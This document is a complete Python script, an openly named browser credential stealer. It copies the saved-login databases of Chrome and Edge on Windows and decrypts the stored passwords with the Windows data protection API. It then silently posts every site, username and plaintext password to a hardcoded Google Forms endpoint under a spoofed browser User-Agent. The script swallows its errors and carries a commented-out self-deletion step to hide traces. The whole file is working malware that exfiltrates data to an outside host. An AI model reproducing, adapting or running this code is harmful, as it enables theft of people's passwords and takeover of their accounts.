import os
import sqlite3
import shutil
import requests
import sys
import time

# Try to import win32crypt. If it fails, the script cannot decrypt passwords.
try:
    import win32crypt
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

# --- CONFIGURATION ---
# Corrected URL for submission
FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfLubCV53OAmrccBydugv-eCUL4lvbWVuU-2TgQmW5_n11LSA/formResponse"
ENTRY_ID = "916815728"

# Browser Paths
LocalStatePath = os.path.expanduser('~') + r"\AppData\Local\{}"
ChromePath = r"\Google\Chrome\User Data"
EdgePath = r"\Microsoft\Edge\User Data"

def decrypt_password(ciphertext):
    if not HAS_WIN32:
        return b""
    try:
        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
    except Exception:
        return b""

def steal_browser_data(browser_name, profile_path_suffix):
    try:
        profile_path = LocalStatePath.format(profile_path_suffix)
        login_db_path = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_db_path):
            return []

        temp_db = "temp_" + browser_name
        shutil.copyfile(login_db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        data = []
        for url, username, password_ciphertext in cursor.fetchall():
            if url and username and password_ciphertext:
                password = decrypt_password(password_ciphertext)
                if password:
                    data.append(f"Site: {url}\nUser: {username}\nPass: {password.decode('utf-8', errors='ignore')}")
        
        conn.close()
        os.remove(temp_db)
        return data
    except Exception as e:
        return []

def send_to_google_form(data_list):
    if not data_list or not FORM_URL or ENTRY_ID == "1234567890":
        return
    
    full_data = "\n\n--- NEW CAPTURE ---\n".join(data_list)
    
    payload = {
        f"entry.{ENTRY_ID}": full_data
    }
    
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        requests.post(FORM_URL, data=payload, headers=headers)
    except Exception:
        pass

def main():
    if not HAS_WIN32:
        # If we can't decrypt, there's no point running
        sys.exit(0)

    all_stolen_data = []

    data = steal_browser_data("Chrome", ChromePath)
    all_stolen_data.extend(data)

    data = steal_browser_data("Edge", EdgePath)
    all_stolen_data.extend(data)

    if all_stolen_data:
        send_to_google_form(all_stolen_data)
    
    # Optional: Self-destruct to hide traces
    # os.remove(sys.executable if getattr(sys, 'frozen', False) else __file__)

if __name__ == "__main__":
    main()
